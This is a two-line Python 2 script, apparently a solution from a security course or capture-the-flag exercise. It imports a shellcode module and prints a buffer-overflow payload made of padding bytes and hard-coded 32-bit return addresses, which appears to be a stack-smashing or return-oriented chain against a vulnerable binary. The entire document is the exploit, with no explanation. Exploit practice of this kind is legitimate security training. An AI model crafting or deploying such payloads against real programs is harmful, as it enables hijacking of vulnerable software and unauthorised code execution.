from shellcode import shellcode
print '\x01'*44 + '\x3d\x97\x04\x08' + '\xad\xaf\x0b\x08' + '\x01'*24 + '\xce\x98\x04\x08'